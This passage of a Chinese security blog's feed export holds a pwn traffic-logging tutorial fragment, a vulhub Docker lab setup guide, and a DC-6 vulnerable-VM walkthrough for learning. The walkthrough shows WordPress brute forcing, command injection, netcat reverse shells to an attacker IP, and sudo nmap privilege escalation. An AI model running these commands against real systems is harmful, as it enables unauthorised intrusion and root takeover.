/home/ctf/orange_cat_diary<span class="hljs-comment">#修改源pwn题目</span><br></code></pre></td></tr></table></figure><p>然后再在存放日志的文件夹中，复制一份源pwn题程序并改名为pwn（这是为了让<code>catch</code>能找到原来的pwn题目）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /home/ctf/.pwn-waf/orange_cat_diary /home/ctf/.pwn-waf/pwn<br><span class="hljs-built_in">chown</span> ctf:ctf /home/ctf/.pwn-waf/pwn<span class="hljs-comment"># 能给777最好，不能给777可以尝试更改文件夹的归属到部署pwn题目的用户（两者必须要能实现其一才行）</span><br></code></pre></td></tr></table></figure><p>至此，其实工作就已经完成了。</p><p>其实到这里还不算完全结束，对于像上述注意事项的那种pwn题目部署方式，在本地进行测试时，还需要创建一个文件夹，即<code>LOG_PATH</code>对应路径的文件夹，因为在服务器的本地，根路径还是根路径，只有通过nc连接的时候根路径才会修改为<code>/home/ctf</code>，所以我们还要创建一个文件夹，并将程序的源文件复制到相应的文件夹并改名为pwn才行。</p><p>去测试一下新pwn程序（catch改名的那个程序能不能运行），成功运行后，打开日志填写文件夹看看有没有记录流量。</p><p>如果以上都成功了，接下来才是重头戏，nc连接测试，只要相应文件夹有日志就成功了。</p>]]></content>
    
    
    <categories>
      
      <category>工具教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>使用教程</tag>
      
      <tag>工具配置</tag>
      
      <tag>pwn</tag>
      
      <tag>流量监听</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub搭建过程</title>
    <link href="/2024/06/01/vulhub%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
    <url>/2024/06/01/vulhub%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="1-docker安装"><a href="#1-docker安装" class="headerlink" title="1. docker安装"></a>1. docker安装</h1><p>直接通过官方提供的脚本进行安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://get.docker.com/ | sh<br></code></pre></td></tr></table></figure><p>如果由于网络等原因无法安装的，可以选择其他安装方法，包括但不限于apt软件源直接安装(可能会出现一些问题，可能是由于某些包没有安装)，可以参考以下官方安装的软件。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406011948924.png" alt="image-20240601194857864"></p><p>通过官方脚本安装的不要忘记启动docker服务了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl start docker<br></code></pre></td></tr></table></figure><h1 id="2-vulhub环境搭建"><a href="#2-vulhub环境搭建" class="headerlink" title="2. vulhub环境搭建"></a>2. vulhub环境搭建</h1><h2 id="2-1-环境下载"><a href="#2-1-环境下载" class="headerlink" title="2.1 环境下载"></a>2.1 环境下载</h2><p>直接从相应的仓库克隆出相应的环境即可，执行下方命令；如果存在各种不同的问题下载不了，也可以到vulhub的github仓库中直接下载源文件放到linux虚拟机中；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure><p>后续如果由于仓库作者更新了新的漏洞环境，我们也可以通过进行<code>vulhub</code>文件夹执行下面的命令来更新漏洞环境</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">git pull</span><br></code></pre></td></tr></table></figure><p>因为可能执行不成功，最暴力的方法就是，删掉！再下一个！！！git clone不成功就之下下载仓库放到虚拟机上。</p><h2 id="2-2-环境启动"><a href="#2-2-环境启动" class="headerlink" title="2.2 环境启动"></a>2.2 环境启动</h2><p>随便进入一个漏洞环境进行演示，假设我们进入<code>/vulhub/django/CVE-2018-14574</code>中，执行该CVE的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ./vulhub/django/CVE-2018-14574<br></code></pre></td></tr></table></figure><p>通过以下命令编译拉取环境，这个过程稍微有点久，但是每个环境只需要拉取一次，下次就不用再拉取了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker compose build<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406012008504.png" alt="image-20240601200836455"></p><p>我只能说着实久，得想点什么别的办法才是。（查资料说，似乎更换docker镜像源可以缓解这个问题，可以尝试一下，测试后，似乎快一点，没太大感觉）</p><p>运行环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker compose up -d<br></code></pre></td></tr></table></figure><p>环境启动后，通过以下命令查看端口映射，以及开放服务的端口进行访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker ps<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406012012521.png" alt="image-20240601201222483"></p><p>最后得知是8000端口映射到8000端口，反正就是8000端口，我们访问开启这个环境的机器的ip地址的8000端口即可达到启动服务的页面。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406012013644.png" alt="image-20240601201332617"></p><h2 id="2-3-关闭环境"><a href="#2-3-关闭环境" class="headerlink" title="2.3 关闭环境"></a>2.3 关闭环境</h2><p>当我们对我们所要进行实验的环境测试完毕后，到相应漏洞的文件夹执行以下命令关闭环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker compose down -v<br></code></pre></td></tr></table></figure><h1 id="3-docker换源方式"><a href="#3-docker换源方式" class="headerlink" title="3. docker换源方式"></a>3. docker换源方式</h1><ol><li>新建或者编辑<code>/etc/docker/daemon.json</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/docker/daemon.json<br></code></pre></td></tr></table></figure><ol start="2"><li>在<code>daemon.json</code>添加或者编译以下内容</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>]<span class="hljs-comment"># 使用163源docker源</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>1.网易:<a href="http://hub-mirror.c.163.com/">http://hub-mirror.c.163.com</a></p><p>2.Docker中国区官方镜像:<a href="https://registry.docker-cn.com/">https://registry.docker-cn.com</a></p><p>3.中国科技大学:<a href="https://docker.mirrors.ustc.edu.cn/">https://docker.mirrors.ustc.edu.cn</a></p><p>4.阿里云容器 服务:<a href="https://cr.console.aliyun.com/%E9%A6%96%E9%A1%B5%E7%82%B9%E5%87%BB%E2%80%9C%E5%88%9B%E5%BB%BA%E6%88%91%E7%9A%84%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E2%80%9D">https://cr.console.aliyun.com/首页点击“创建我的容器镜像”</a>  得到一个专属的镜像加速地址，类似于“<a href="https://1234abcd.mirror.aliyuncs.com”(要自己创建,每个人不一样)/">https://1234abcd.mirror.aliyuncs.com”(要自己创建，每个人不一样)</a></p></blockquote><ol start="3"><li>重启docker服务</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl restart docker<br></code></pre></td></tr></table></figure><ol start="4"><li>查看换源是否成功</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker info<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202406012022337.png" alt="image-20240601202217291"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
      <tag>web攻防</tag>
      
      <tag>渗透学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dc-6打靶日记</title>
    <link href="/2024/05/31/dc-6%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/05/31/dc-6%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><p>通过开关靶机测量当前网段存活的机器确定IP地址，也可以直接通过MAC地址的表示来确定IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.31.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301829292.png" alt="image-20240530182956229"></p><blockquote><p>目标ip地址：192.168.31.230</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT --min-rate 10000 -p- 192.168.31.230 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301834823.png" alt="image-20240530183421790"></p><blockquote><p>开放端口：22,80</p></blockquote><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.31.230 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301834622.png" alt="image-20240530183447588"></p><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sT -sV -sC -O -p22,80 192.168.31.230 -oA nmapscan/tcpports_Detail<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301838595.png" alt="image-20240530183639570"></p><blockquote><p>能够得到的信息有：</p><p>端口80：apache&#x2F;2.4.25；操作系统信息Linux 3.2-4.9</p><p>端口22：openSSH 7.4p1</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p22,80 192.168.31.230 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301838294.png" alt="image-20240530183852256"></p><blockquote><p>扫到的一些有用的信息：</p><p>Wordpress版本、wordpress登录界面、以及用户名（admin、graham、mark、sarah、jens）</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-http页面"><a href="#2-1-http页面" class="headerlink" title="2.1 http页面"></a>2.1 http页面</h2><p>访问80端口开启的http服务，发现进行了重定向，尝试修改hosts文件</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301933907.png" alt="image-20240530193331864"></p><p>通过向hosts文件添加以下内容来绕过重定向</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.31.230</span>wordy<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301935482.png" alt="image-20240530193547300"></p><p>ok，成功绕过了，然后我们获取一下一些有用的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301938341.png" alt="image-20240530193815257"></p><p>这里，它一直在强调wordy插件安全的重要性，似乎就是想告诉我们它的插件并不安全，可以想办法利用插件的漏洞进行getshell</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405301939557.png" alt="image-20240530193916527"></p><p>通过工具查询到了相应的指纹确认该网页使用了WordPressCMS，查看这方面的漏洞.</p><h2 id="2-2-目录爆破"><a href="#2-2-目录爆破" class="headerlink" title="2.2 目录爆破"></a>2.2 目录爆破</h2><ul><li>gobuster目录爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.31.230 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405302033628.png" alt="image-20240530203320567"></p><blockquote><p>&#x2F;wp-content<br>&#x2F;wp-includes<br>&#x2F;wp-admin</p></blockquote><ul><li>dirsearch目录爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.31.230 -x400-500 -t4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405302103365.png" alt="image-20240530210327316"></p><blockquote><p><a href="http://192.168.31.230/index.php">http://192.168.31.230/index.php</a><br><a href="http://192.168.31.230/license.txt">http://192.168.31.230/license.txt</a><br><a href="http://192.168.31.230/readme.html">http://192.168.31.230/readme.html</a><br><a href="http://192.168.31.230/wp-admin">http://192.168.31.230/wp-admin</a><br><a href="http://192.168.31.230/wp-admin/install.php">http://192.168.31.230/wp-admin/install.php</a><br><a href="http://192.168.31.230/wp-config.php">http://192.168.31.230/wp-config.php</a><br><a href="http://192.168.31.230/wp-content/">http://192.168.31.230/wp-content/</a><br><a href="http://192.168.31.230/wp-cron.php">http://192.168.31.230/wp-cron.php</a><br><a href="http://192.168.31.230/wp-includes">http://192.168.31.230/wp-includes</a><br><a href="http://192.168.31.230/wp-login.php">http://192.168.31.230/wp-login.php</a><br><a href="http://192.168.31.230/wp-signup.php">http://192.168.31.230/wp-signup.php</a></p></blockquote><ul><li>dirb目录爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.31.230 -r<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405302109609.png" alt="image-20240530210849084"></p><p>经过三轮的目录扫描最终得到的总目录连接如下:</p><blockquote><p><a href="http://192.168.31.230/index.php">http://192.168.31.230/index.php</a><br><a href="http://192.168.31.230/license.txt">http://192.168.31.230/license.txt</a><br><a href="http://192.168.31.230/readme.html">http://192.168.31.230/readme.html</a><br><a href="http://192.168.31.230/wp-admin">http://192.168.31.230/wp-admin</a><br><a href="http://192.168.31.230/wp-admin/install.php">http://192.168.31.230/wp-admin/install.php</a><br><a href="http://192.168.31.230/wp-config.php">http://192.168.31.230/wp-config.php</a><br><a href="http://192.168.31.230/wp-content/">http://192.168.31.230/wp-content/</a><br><a href="http://192.168.31.230/wp-cron.php">http://192.168.31.230/wp-cron.php</a><br><a href="http://192.168.31.230/wp-includes">http://192.168.31.230/wp-includes</a><br><a href="http://192.168.31.230/wp-login.php">http://192.168.31.230/wp-login.php</a><br><a href="http://192.168.31.230/wp-signup.php">http://192.168.31.230/wp-signup.php</a></p></blockquote><h2 id="2-3-后台爆破"><a href="#2-3-后台爆破" class="headerlink" title="2.3 后台爆破"></a>2.3 后台爆破</h2><p>对于WordPress有一个专门列举用户名的工具<code>wpscan</code>，我们可以通过它来列举出可以爆破的用户名，然后记录下来，进行相应的爆破；</p><p> <img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311800717.png" alt="image-20240531180041643"></p><blockquote><p>根据上述的结果可知存在的用户名有：</p><p>admin</p><p>sarah</p><p>graham</p><p>mark</p><p>jens</p></blockquote><p>将上述的用户名写入到一个字典中，用于后续的用户名密码爆破。在kali自带的字典库中存在一个专门用于密码爆破的字典<code>rockyou.txt</code>（用这个密码字典啊，破两天估计都破不完，我们不这么弄了，换个方法吧），我们将其复制一份到当前目录用户密码爆破，然后使用该字典通过wpscan爆破密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span>  /usr/share/wordlists/rockyou.txt password.txt<br>wpscan --url http://wordy/ -U username.txt -P password.txt<br></code></pre></td></tr></table></figure><p>我依稀记得之前打DC-2的时候用过一个东西叫做<code>cerl</code>，我们用它生成一个密码字典试试，不行再说；</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cewl</span> http://wordy/ -w cerl_password.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311815380.png" alt="image-20240531181502348"></p><p>使用通过该方式生成的字典在进行一次用户名密码爆破尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://wordy/ -U username.txt -P cerl_password.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311823955.png" alt="image-20240531182309905"></p><p>好吧，没办法，可以先试试其他的字典，那个<code>rockyou.txt</code>字典实在是有点大了，如果其他密码字典也不行再去试试它把；最后确实没辙，跑<code>rockyou.txt</code>跑不出来，跑其他的也跑不出来，最后发现人家作者给了提示！</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311832521.png" alt="image-20240531183242453"></p><p>按着作者给的提示的方法创建字典，再进行用户名和密码的爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; k01_password.txt<br>wpscan --url http://wordy/ -U username.txt -P k01_password.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311844580.png" alt="image-20240531184459519"></p><p>终于好了，经过作者的提示我们也是成功的获得了登录后台管理系统的用户名和密码</p><blockquote><p>username：mark</p><p>password：helpdesk01</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311846587.png" alt="image-20240531184632537"></p><h2 id="2-4-后台信息获取"><a href="#2-4-后台信息获取" class="headerlink" title="2.4 后台信息获取"></a>2.4 后台信息获取</h2><p>在DC系列靶机中，来到后台一般离拿到webshell权限都只有一步了，想办法找能够执行命令反弹shell的点就好了</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311856656.png" alt="image-20240531185643592"></p><p>发现该WordPress系统使用了<code>Activity monitor</code>工具（也可以理解为插件），通过searchsploit扫描是能够扫到相应的漏洞的</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">searchsploit WordPress Activity <span class="hljs-literal">monitor</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311858061.png" alt="image-20240531185822013"></p><p>除此之外还在该工具上发现了一个比较奇怪的工具，似乎有一定的功能，但是不知道是什么玩意，可以用burpsuite抓包看看。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311902029.png" alt="image-20240531190202979"></p><p>经过尝试，在<code>Convert</code>按钮的处理中似乎并不存在什么安全问题，而是下面的<code>Lookup</code>按钮存在安全问题，它说：“如果dig在web服务器上安装了，那也可以被用作搜索”，似乎是指会搜索相应内容的意思，通过执行一些命令进行尝试，发现并没有解析什么ip地址或者域名啥的，但是通过并列执行后发现，似乎可以进行命令执行，当在这里输入</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">yahu.<span class="hljs-keyword">com</span>|<span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><p>然后执行<code>Lookup</code>发现可以进行命令执行</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311913662.png" alt="image-20240531191335612"></p><p>在进行一下简单的尝试后，发现跟其他都没什么关系，只有前面那部分存在一个<code>.</code>，不管后面是什么都会进行执行，尝试进行反弹shell</p><p>在攻击机监听5555端口，然后使用目标机进行命令执行反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.|nc -e /bin/bash 192.168.31.221 5555<br></code></pre></td></tr></table></figure><p>不巧的是，发现具有长度限制，哎，抓个包看看能不能该发送的内容呗，因为没有发现就已经不让输入了，大概率是前端检测，抓包应该能修改发送的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311916042.png" alt="image-20240531191654988"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311918269.png" alt="image-20240531191810226"></p><p>ok成功登录，webshell拿下了，剩下又是提权的问题了，再次之前先通过命令开启一下互动终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311920103.png" alt="image-20240531192046061"></p><p>好了这回是真没问题了，继续吧！</p><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><h2 id="3-1-命令提权"><a href="#3-1-命令提权" class="headerlink" title="3.1 命令提权"></a>3.1 命令提权</h2><p>先查一下看看有没有什么命令可以用来提权的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311924922.png" alt="image-20240531192316107"></p><p>有一个似乎可以用来提权<code>mount</code>，但这个大概率都无法成功，先试试吧；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311924675.png" alt="image-20240531192418364"></p><p>ok，没有问题，毫无疑问的失败了，找找看有没有别的办法提权吧</p><h2 id="3-2-信息收集"><a href="#3-2-信息收集" class="headerlink" title="3.2 信息收集"></a>3.2 信息收集</h2><p>怎么说呢，这个过程无聊且繁琐，但是确实是一定要经历的。你就每个目录都翻，你觉得重要的就翻，我觉得重要的就是每个人的用户，都翻翻；</p><p>最后在mark用户的目录下的<code>stuff</code>文件中翻到了他的备忘录吧应该是，然后发现它建立了一个用户，而且写上了用户名和密码</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311930183.png" alt="image-20240531193028135"></p><blockquote><p>username: graham</p><p>password: GSo7isUM1D4</p></blockquote><p>通过命令直接登录graham用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su graham<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311944043.png" alt="image-20240531194351342"></p><p>查看是否存在具有可用于提权的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311944725.png" alt="image-20240531194450684"></p><p>提权命令没发现，但是发现了一个无密码用户<code>jens</code>，由于无密码是无法登录jens的，但是它说jens具有执行<code>backups.sh</code>的权利</p><p>那我们尝试去执行一下那个脚本，之前通过信息搜集也看到过那个脚本，但是里面是一个解压命令，就没太过关注</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311947445.png" alt="image-20240531194714401"></p><p>尝试执行一下这个脚本，权限不够，那是因为没有通过jens去执行这个脚本</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311948312.png" alt="image-20240531194802267"></p><p>通过使用sudo命令通过jens身份去执行这个脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311953914.png" alt="image-20240531195329869"></p><p>确实可以执行该脚本，那么我们具有jens身份执行的脚本，那如果我们将其中的命令修改为反弹shell的脚本，那我们就可以登录jens用户，说干就干，写入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 192.168.31.221 22222&quot;</span> &gt; backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311956614.png" alt="image-20240531195602560"></p><p>攻击机监听对应的端口号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 22222<br></code></pre></td></tr></table></figure><p>再次以jens身份执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u jens ./backups.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311957397.png" alt="image-20240531195723341"></p><p>ok,成功反弹shell，没有问题，再启动互动终端，纯为了好看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311958699.png" alt="image-20240531195830648"></p><p>再次查看有没有什么可以用来提权的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405311959957.png" alt="image-20240531195910901"></p><p>这次没问题了，真有可以用来提权的命令，提权启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/sh&quot;)&#x27;</span> &gt;/tmp/.123<br>sudo nmap --script=/tmp/.123<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312001256.png" alt="image-20240531200116191"></p><p>提权成功，下班！不行不行，在找个flag先</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202405312002795.png" 